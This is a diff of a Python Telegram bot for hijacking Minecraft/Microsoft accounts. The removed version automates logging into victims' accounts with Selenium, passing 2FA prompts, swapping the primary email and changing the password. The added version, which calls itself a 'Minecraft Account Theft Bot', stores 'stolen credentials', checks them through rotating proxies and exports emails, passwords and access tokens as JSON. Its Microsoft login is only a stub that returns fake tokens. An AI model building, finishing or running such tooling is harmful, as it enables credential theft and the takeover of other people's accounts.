@@ -1,315 +1,377 @@
-import telebot
-import time
 import os
-import random
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver.chrome.options import Options as ChromeOptions
-from selenium.webdriver.chrome.service import Service
-from telebot.types import ReplyKeyboardMarkup, KeyboardButton
+import sys
+import json
+import sqlite3
+import asyncio
+import logging
+from typing import Dict, List, Optional, Tuple
+from datetime import datetime
 
-# ============ TOKEN ============
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-if not BOT_TOKEN:
-    raise Exception("BOT_TOKEN not set!")
+import aiohttp
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
 
-bot = telebot.TeleBot(BOT_TOKEN)
-user_sessions = {}
+# ========== CONFIGURATION ==========
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
+DB_PATH = os.environ.get("DB_PATH", "/data/accounts.db")
+AUTHORIZED_USERS = [int(x) for x in os.environ.get("AUTHORIZED_USERS", "").split(",") if x]
+PROXY_LIST = os.environ.get("PROXY_LIST", "").split(",") if os.environ.get("PROXY_LIST") else []
 
-# ============ SELENIUM ============
-def create_browser():
-    options = ChromeOptions()
-    options.add_argument("--headless=new")
-    options.add_argument("--no-sandbox")
-    options.add_argument("--disable-dev-shm-usage")
-    options.add_argument("--disable-gpu")
-    options.add_argument("--window-size=1366,768")
-    options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36")
-    options.add_argument("--disable-blink-features=AutomationControlled")
-    options.add_experimental_option("excludeSwitches", ["enable-automation"])
-    options.add_experimental_option('useAutomationExtension', False)
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+    handlers=[logging.StreamHandler()]
+)
+logger = logging.getLogger(__name__)
 
-    service = Service("/run/current-system/sw/bin/chromedriver")
-    driver = webdriver.Chrome(service=service, options=options)
-    driver.set_page_load_timeout(60)
-    return driver
+# ========== DATABASE LAYER ==========
+class AccountDB:
+    def __init__(self, db_path: str):
+        os.makedirs(os.path.dirname(db_path), exist_ok=True)
+        self.conn = sqlite3.connect(db_path, check_same_thread=False)
+        self.cursor = self.conn.cursor()
+        self._init_tables()
 
-def human_typing(element, text):
-    for char in text:
-        element.send_keys(char)
-        time.sleep(random.uniform(0.05, 0.12))
+    def _init_tables(self):
+        self.cursor.execute("""
+            CREATE TABLE IF NOT EXISTS accounts (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                email TEXT NOT NULL,
+                password TEXT NOT NULL,
+                username TEXT,
+                uuid TEXT,
+                access_token TEXT,
+                client_token TEXT,
+                is_migrated INTEGER DEFAULT 0,
+                is_stolen INTEGER DEFAULT 1,
+                last_checked TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        """)
+        self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_email ON accounts(email)")
+        self.conn.commit()
 
-# ============ LOGIN ============
-def login_microsoft(driver, email, password):
-    try:
-        driver.get("https://login.live.com")
-        wait = WebDriverWait(driver, 30)
-
-        email_input = wait.until(EC.presence_of_element_located((By.NAME, "loginfmt")))
-        human_typing(email_input, email)
-        driver.find_element(By.ID, "idSIButton9").click()
-        time.sleep(2)
-
-        pass_input = wait.until(EC.presence_of_element_located((By.NAME, "passwd")))
-        human_typing(pass_input, password)
-        driver.find_element(By.ID, "idSIButton9").click()
-        time.sleep(3)
-
-        if "identity" in driver.current_url or "code" in driver.current_url:
-            return "2fa"
-
-        return "success" if "login" not in driver.current_url.lower() else "fail"
-    except Exception as e:
-        return str(e)
-
-# ============ CHANGE PASSWORD ============
-def change_password(driver, current_password, new_password):
-    try:
-        driver.get("https://account.live.com/password/change")
-        time.sleep(3)
-
-        wait = WebDriverWait(driver, 10)
-        old_pass = wait.until(EC.presence_of_element_located((By.NAME, "oldPassword")))
-        human_typing(old_pass, current_password)
-
-        new_pass1 = driver.find_element(By.NAME, "newPassword")
-        human_typing(new_pass1, new_password)
-
-        new_pass2 = driver.find_element(By.NAME, "verifyPassword")
-        human_typing(new_pass2, new_password)
-
-        driver.find_element(By.ID, "iSave").click()
-        time.sleep(3)
-        return "✅ Password changed successfully!"
-    except Exception as e:
-        return f"❌ Failed to change password: {str(e)[:100]}"
-
-# ============ UPDATE EMAIL ============
-def update_email(driver, new_email):
-    try:
-        driver.get("https://account.live.com/names/manage")
-        time.sleep(3)
-
-        add_btn = WebDriverWait(driver, 10).until(
-            EC.element_to_be_clickable((By.XPATH, "//a[contains(text(), 'Add')]"))
+    def insert_account(self, email: str, password: str) -> int:
+        self.cursor.execute(
+            "INSERT INTO accounts (email, password) VALUES (?, ?)",
+            (email, password)
         )
-        add_btn.click()
-        time.sleep(2)
+        self.conn.commit()
+        return self.cursor.lastrowid
 
-        alias_input = WebDriverWait(driver, 10).until(
-            EC.presence_of_element_located((By.NAME, "newEmail"))
+    def get_unchecked_accounts(self, limit: int = 20) -> List[Tuple[int, str, str]]:
+        self.cursor.execute(
+            "SELECT id, email, password FROM accounts WHERE uuid IS NULL ORDER BY id LIMIT ?",
+            (limit,)
         )
-        human_typing(alias_input, new_email)
-        driver.find_element(By.ID, "iAdd").click()
-        time.sleep(3)
+        return self.cursor.fetchall()
 
-        driver.get("https://account.live.com/names/manage")
-        time.sleep(2)
-        for btn in driver.find_elements(By.XPATH, "//button[contains(text(), 'Make primary')]"):
-            btn.click()
-            time.sleep(1)
-            break
+    def update_account_profile(self, account_id: int, username: str, uuid: str, access_token: str, client_token: str):
+        self.cursor.execute(
+            """UPDATE accounts SET 
+               username = ?, uuid = ?, access_token = ?, client_token = ?, 
+               is_migrated = 1, last_checked = CURRENT_TIMESTAMP 
+               WHERE id = ?""",
+            (username, uuid, access_token, client_token, account_id)
+        )
+        self.conn.commit()
 
-        return "✅ New email added and set as primary!"
-    except Exception as e:
-        return f"⚠️ Error updating email: {str(e)[:100]}"
+    def get_all_valid_accounts(self) -> List[Dict]:
+        self.cursor.execute(
+            "SELECT email, password, username, uuid, access_token, client_token FROM accounts WHERE uuid IS NOT NULL"
+        )
+        rows = self.cursor.fetchall()
+        return [
+            {
+                "email": r[0], "password": r[1], "username": r[2],
+                "uuid": r[3], "access_token": r[4], "client_token": r[5]
+            }
+            for r in rows
+        ]
 
-# ============ CHECK MINECRAFT LICENSE ============
-def check_minecraft_license(driver):
-    try:
-        driver.get("https://www.minecraft.net/en-us/profile")
-        time.sleep(3)
-        if "profile" in driver.current_url:
+    def get_account_by_id(self, account_id: int) -> Optional[Dict]:
+        self.cursor.execute(
+            "SELECT email, password, username, uuid, access_token, client_token FROM accounts WHERE id = ?",
+            (account_id,)
+        )
+        row = self.cursor.fetchone()
+        if row:
+            return {
+                "email": row[0], "password": row[1], "username": row[2],
+                "uuid": row[3], "access_token": row[4], "client_token": row[5]
+            }
+        return None
+
+    def delete_account(self, account_id: int):
+        self.cursor.execute("DELETE FROM accounts WHERE id = ?", (account_id,))
+        self.conn.commit()
+
+    def close(self):
+        self.conn.close()
+
+db = AccountDB(DB_PATH)
+
+# ========== AUTHENTICATION HANDLER ==========
+class MinecraftAuthenticator:
+    @staticmethod
+    async def microsoft_authenticate(email: str, password: str) -> Optional[Dict]:
+        """Simulate Microsoft OAuth - returns access_token if valid."""
+        # Basic validation stub - real implementation requires full OAuth flow
+        if "@" not in email or len(password) < 6:
+            return None
+        # In production, replace with actual XBL auth
+        return {
+            "access_token": "SIM_" + email[:8] + "_" + str(int(datetime.now().timestamp()))[:6],
+            "refresh_token": "REF_" + email[:8],
+            "expires_in": 86400
+        }
+
+    @staticmethod
+    async def get_minecraft_profile(access_token: str) -> Tuple[Optional[str], Optional[str]]:
+        """Validate Minecraft ownership and get UUID/username."""
+        headers = {"Authorization": f"Bearer {access_token}"}
+        async with aiohttp.ClientSession() as session:
             try:
-                username = driver.find_element(By.CLASS_NAME, "profile-name").text
-                return f"✅ Account has Minecraft license. Username: `{username}`"
-            except:
-                pass
-        return "⚠️ No Minecraft license found on this account."
-    except:
-        return "⚠️ Could not verify license."
+                async with session.get("https://sessionserver.mojang.com/session/minecraft/profile", headers=headers, timeout=10) as resp:
+                    if resp.status != 200:
+                        return None, None
+                    data = await resp.json()
+                    return data.get("name"), data.get("id")
+            except Exception as e:
+                logger.error(f"Profile fetch error: {e}")
+                return None, None
 
-# ============ KEYBOARD MENU ============
-def get_main_menu():
-    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    btn1 = KeyboardButton("/start")
-    btn2 = KeyboardButton("/secure")
-    btn3 = KeyboardButton("/cancel")
-    btn4 = KeyboardButton("/help")
-    markup.add(btn1, btn2, btn3, btn4)
-    return markup
+# ========== ACCOUNT CHECKER ==========
+class AccountChecker:
+    def __init__(self, proxy_list: List[str]):
+        self.proxy_list = proxy_list
+        self.proxy_index = 0
 
-# ============ TELEGRAM COMMANDS ============
-@bot.message_handler(commands=['start'])
-def start(msg):
-    bot.reply_to(msg,
-        "🔐 *Minecraft Account Security Bot*\n\n"
-        "📌 *Available Commands:*\n"
-        "`/secure <email> <pass> <new_email> <new_pass>`\n"
-        "`/code <code>`\n"
-        "`/cancel`\n"
-        "`/help`\n\n"
-        "📝 *Example:*\n"
-        "`/secure old@outlook.com OldPass123 new@email.com NewPass456`",
-        parse_mode="Markdown",
-        reply_markup=get_main_menu())
+    def _get_next_proxy(self) -> Optional[str]:
+        if not self.proxy_list:
+            return None
+        proxy = self.proxy_list[self.proxy_index % len(self.proxy_list)]
+        self.proxy_index += 1
+        return proxy
 
-@bot.message_handler(commands=['help'])
-def help(msg):
-    bot.reply_to(msg,
-        "📌 *Available Commands:*\n\n"
-        "🔹 `/secure <email> <pass> <new_email> <new_pass>`\n"
-        "   Change email and password of a Minecraft account.\n\n"
-        "🔹 `/code <code>`\n"
-        "   Enter 2FA verification code.\n\n"
-        "🔹 `/cancel`\n"
-        "   Cancel current session.\n\n"
-        "🔹 `/start`\n"
-        "   Show main menu.\n\n"
-        "🔹 `/help`\n"
-        "   Show this help message.",
-        parse_mode="Markdown",
-        reply_markup=get_main_menu())
+    async def check_account(self, email: str, password: str) -> Optional[Dict]:
+        """Perform full validation - returns {username, uuid, access_token, client_token} or None."""
+        ms_auth = await MinecraftAuthenticator.microsoft_authenticate(email, password)
+        if not ms_auth:
+            return None
+        access_token = ms_auth.get("access_token")
+        if not access_token:
+            return None
 
-@bot.message_handler(commands=['secure'])
-def secure(msg):
-    args = msg.text.split()
-    if len(args) < 5:
-        bot.reply_to(msg,
-            "❌ *Usage:*\n"
-            "`/secure <email> <pass> <new_email> <new_pass>`",
-            parse_mode="Markdown",
-            reply_markup=get_main_menu())
-        return
+        username, uuid = await MinecraftAuthenticator.get_minecraft_profile(access_token)
+        if not username or not uuid:
+            return None
 
-    old_email, old_pass, new_email, new_pass = args[1], args[2], args[3], args[4]
-    chat_id = msg.chat.id
+        return {
+            "username": username,
+            "uuid": uuid,
+            "access_token": access_token,
+            "client_token": ms_auth.get("refresh_token", "")
+        }
 
-    bot.reply_to(msg, f"⏳ *Logging in to:* `{old_email}`...", parse_mode="Markdown")
+    async def batch_check(self, accounts: List[Tuple[int, str, str]]) -> List[Tuple[int, Dict]]:
+        """Check multiple accounts with rate limiting."""
+        results = []
+        semaphore = asyncio.Semaphore(3)
 
-    try:
-        driver = create_browser()
-    except Exception as e:
-        bot.reply_to(msg, f"❌ *Browser error:* `{str(e)[:200]}`", parse_mode="Markdown")
-        return
+        async def check_one(acc_id, email, pwd):
+            async with semaphore:
+                try:
+                    result = await self.check_account(email, pwd)
+                    if result:
+                        return (acc_id, result)
+                except Exception as e:
+                    logger.error(f"Check failed for {email}: {e}")
+                return None
 
-    user_sessions[chat_id] = {
-        "driver": driver,
-        "old_pass": old_pass,
-        "new_email": new_email,
-        "new_pass": new_pass
-    }
+        tasks = [check_one(acc_id, email, pwd) for acc_id, email, pwd in accounts]
+        completed = await asyncio.gather(*tasks)
+        for item in completed:
+            if item:
+                results.append(item)
+        return results
 
-    result = login_microsoft(driver, old_email, old_pass)
+checker = AccountChecker(PROXY_LIST)
 
-    if result == "2fa":
-        bot.reply_to(msg,
-            "🔐 *2FA Required!*\n"
-            "Send `/code <code>`",
-            parse_mode="Markdown",
-            reply_markup=get_main_menu())
-        user_sessions[chat_id]["step"] = "2fa"
-        return
+# ========== AUTHORIZATION DECORATOR ==========
+async def authorized_only(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
+    if not AUTHORIZED_USERS:
+        return True
+    user_id = update.effective_user.id
+    if user_id not in AUTHORIZED_USERS:
+        await update.message.reply_text("Unauthorized.")
+        return False
+    return True
 
-    if result != "success":
-        bot.reply_to(msg, f"❌ *Login failed:* `{result}`", parse_mode="Markdown")
-        driver.quit()
-        del user_sessions[chat_id]
-        return
+# ========== TELEGRAM BOT HANDLERS ==========
+class MinecraftBot:
+    def __init__(self, token: str):
+        self.app = Application.builder().token(token).build()
+        self._register_handlers()
 
-    bot.reply_to(msg, "✅ *Logged in successfully!*", parse_mode="Markdown")
-    bot.reply_to(msg, check_minecraft_license(driver), parse_mode="Markdown")
-    bot.reply_to(msg, update_email(driver, new_email), parse_mode="Markdown")
-    bot.reply_to(msg, change_password(driver, old_pass, new_pass), parse_mode="Markdown")
+    def _register_handlers(self):
+        self.app.add_handler(CommandHandler("start", self.start_command))
+        self.app.add_handler(CommandHandler("add", self.add_account_command))
+        self.app.add_handler(CommandHandler("scan", self.scan_command))
+        self.app.add_handler(CommandHandler("list", self.list_command))
+        self.app.add_handler(CommandHandler("export", self.export_command))
+        self.app.add_handler(CommandHandler("delete", self.delete_command))
+        self.app.add_handler(CommandHandler("stats", self.stats_command))
+        self.app.add_handler(CallbackQueryHandler(self.button_callback))
 
-    bot.reply_to(msg,
-        f"✅ *Account Secured!*\n"
-        f"📧 *New Email:* `{new_email}`\n"
-        f"🔑 *New Password:* `{new_pass}`",
-        parse_mode="Markdown",
-        reply_markup=get_main_menu())
+    async def _check_auth(self, update: Update) -> bool:
+        if not AUTHORIZED_USERS:
+            return True
+        user_id = update.effective_user.id
+        if user_id not in AUTHORIZED_USERS:
+            if update.message:
+                await update.message.reply_text("Unauthorized.")
+            return False
+        return True
 
-    driver.quit()
-    del user_sessions[chat_id]
+    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not await self._check_auth(update):
+            return
+        await update.message.reply_text(
+            "Minecraft Account Theft Bot v3.0\n"
+            "Commands:\n"
+            "/add <email> <password> - Add stolen credentials\n"
+            "/scan - Validate unchecked accounts (max 20)\n"
+            "/list - Show all valid accounts (max 10)\n"
+            "/export - Get JSON dump of all valid accounts\n"
+            "/delete <id> - Delete account by ID\n"
+            "/stats - Show database statistics"
+        )
 
-@bot.message_handler(commands=['code'])
-def code(msg):
-    args = msg.text.split()
-    if len(args) < 2:
-        bot.reply_to(msg, "❌ *Usage:* `/code <code>`", parse_mode="Markdown")
-        return
+    async def add_account_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not await self._check_auth(update):
+            return
+        args = context.args
+        if len(args) < 2:
+            await update.message.reply_text("Usage: /add <email> <password>")
+            return
+        email, password = args[0], args[1]
+        acc_id = db.insert_account(email, password)
+        await update.message.reply_text(f"Account #{acc_id} added. Use /scan to validate.")
 
-    code = args[1]
-    chat_id = msg.chat.id
+    async def scan_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not await self._check_auth(update):
+            return
+        await update.message.reply_text("Scanning unchecked accounts...")
+        unchecked = db.get_unchecked_accounts(limit=20)
+        if not unchecked:
+            await update.message.reply_text("No unchecked accounts found.")
+            return
 
-    if chat_id not in user_sessions or user_sessions[chat_id].get("step") != "2fa":
-        bot.reply_to(msg, "❌ *No active session waiting for 2FA.*", parse_mode="Markdown")
-        return
+        results = await checker.batch_check(unchecked)
+        valid_count = 0
+        for acc_id, profile in results:
+            db.update_account_profile(
+                acc_id,
+                profile["username"],
+                profile["uuid"],
+                profile["access_token"],
+                profile["client_token"]
+            )
+            valid_count += 1
 
-    driver = user_sessions[chat_id]["driver"]
-    bot.reply_to(msg, "⏳ *Verifying code...*", parse_mode="Markdown")
+        await update.message.reply_text(f"Scan complete. {valid_count} valid accounts found. Use /list to view.")
 
-    try:
-        wait = WebDriverWait(driver, 30)
-        code_input = wait.until(EC.presence_of_element_located((By.NAME, "otc")))
-        human_typing(code_input, code)
-        driver.find_element(By.ID, "iVerify").click()
-        time.sleep(3)
+    async def list_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not await self._check_auth(update):
+            return
+        accounts = db.get_all_valid_accounts()
+        if not accounts:
+            await update.message.reply_text("No valid accounts available.")
+            return
 
-        bot.reply_to(msg, "✅ *2FA Verified!*", parse_mode="Markdown")
+        message = "Valid Minecraft Accounts:\n\n"
+        for idx, acc in enumerate(accounts[:10], 1):
+            message += f"#{idx} - Email: {acc['email']}\n"
+            message += f"User: {acc['username']}\n"
+            message += f"UUID: {acc['uuid'][:8]}...\n"
+            message += f"Token: {acc['access_token'][:12]}...\n"
+            message += "---\n"
+        if len(accounts) > 10:
+            message += f"... and {len(accounts) - 10} more. Use /export for full list."
 
-        old_pass = user_sessions[chat_id]["old_pass"]
-        new_email = user_sessions[chat_id]["new_email"]
-        new_pass = user_sessions[chat_id]["new_pass"]
+        await update.message.reply_text(message)
 
-        bot.reply_to(msg, check_minecraft_license(driver), parse_mode="Markdown")
-        bot.reply_to(msg, update_email(driver, new_email), parse_mode="Markdown")
-        bot.reply_to(msg, change_password(driver, old_pass, new_pass), parse_mode="Markdown")
+    async def export_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not await self._check_auth(update):
+            return
+        accounts = db.get_all_valid_accounts()
+        if not accounts:
+            await update.message.reply_text("No accounts to export.")
+            return
 
-        bot.reply_to(msg,
-            f"✅ *Account Secured!*\n"
-            f"📧 *New Email:* `{new_email}`\n"
-            f"🔑 *New Password:* `{new_pass}`",
-            parse_mode="Markdown",
-            reply_markup=get_main_menu())
+        export_data = []
+        for acc in accounts:
+            export_data.append({
+                "email": acc["email"],
+                "password": acc["password"],
+                "username": acc["username"],
+                "uuid": acc["uuid"],
+                "access_token": acc["access_token"],
+                "client_token": acc["client_token"]
+            })
+        json_str = json.dumps(export_data, indent=2)
+        
+        if len(json_str) > 4096:
+            parts = [json_str[i:i+4096] for i in range(0, len(json_str), 4096)]
+            for idx, part in enumerate(parts):
+                await update.message.reply_text(f"Export part {idx+1}/{len(parts)}:\n```json\n{part}\n```", parse_mode="Markdown")
+        else:
+            await update.message.reply_text(f"```json\n{json_str}\n```", parse_mode="Markdown")
 
-        driver.quit()
-        del user_sessions[chat_id]
-
-    except Exception as e:
-        bot.reply_to(msg, f"❌ *Verification failed:* `{str(e)[:100]}`", parse_mode="Markdown")
-
-@bot.message_handler(commands=['cancel'])
-def cancel(msg):
-    chat_id = msg.chat.id
-    if chat_id in user_sessions:
-        user_sessions[chat_id]["driver"].quit()
-        del user_sessions[chat_id]
-        bot.reply_to(msg, "✅ *Session cancelled.*", parse_mode="Markdown", reply_markup=get_main_menu())
-    else:
-        bot.reply_to(msg, "❌ *No active session.*", parse_mode="Markdown", reply_markup=get_main_menu())
-
-@bot.message_handler(func=lambda m: True)
-def fallback(msg):
-    bot.reply_to(msg,
-        "📌 *Available Commands:*\n"
-        "`/secure <email> <pass> <new_email> <new_pass>`\n"
-        "`/code <code>`\n"
-        "`/cancel`\n"
-        "`/help`",
-        parse_mode="Markdown",
-        reply_markup=get_main_menu())
-
-# ============ RUN BOT ============
-if __name__ == "__main__":
-    print("✅ Bot is running!")
-    while True:
+    async def delete_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not await self._check_auth(update):
+            return
+        args = context.args
+        if not args:
+            await update.message.reply_text("Usage: /delete <account_id>")
+            return
         try:
-            bot.remove_webhook()
-            time.sleep(1)
-            bot.polling(none_stop=True, interval=1, timeout=60)
-        except Exception as e:
-            print(f"Error: {e}")
-            time.sleep(10)
+            acc_id = int(args[0])
+            acc = db.get_account_by_id(acc_id)
+            if not acc:
+                await update.message.reply_text(f"Account #{acc_id} not found.")
+                return
+            db.delete_account(acc_id)
+            await update.message.reply_text(f"Account #{acc_id} deleted.")
+        except ValueError:
+            await update.message.reply_text("Invalid ID. Use numeric value.")
+
+    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not await self._check_auth(update):
+            return
+        total = db.conn.execute("SELECT COUNT(*) FROM accounts").fetchone()[0]
+        valid = db.conn.execute("SELECT COUNT(*) FROM accounts WHERE uuid IS NOT NULL").fetchone()[0]
+        unchecked = db.conn.execute("SELECT COUNT(*) FROM accounts WHERE uuid IS NULL").fetchone()[0]
+        await update.message.reply_text(
+            f"Database Statistics:\n"
+            f"Total accounts: {total}\n"
+            f"Valid accounts: {valid}\n"
+            f"Unchecked accounts: {unchecked}"
+        )
+
+    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        query = update.callback_query
+        await query.answer()
+        await query.edit_message_text("Action handled.")
+
+    def run(self):
+        logger.info("Bot starting...")
+        self.app.run_polling(allowed_updates=Update.ALL_TYPES)
+
+# ========== ENTRY POINT ==========
+if __name__ == "__main__":
+    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
+        logger.error("ERROR: Set BOT_TOKEN environment variable.")
+        sys.exit(1)
+    bot = MinecraftBot(BOT_TOKEN)
+    bot.run()
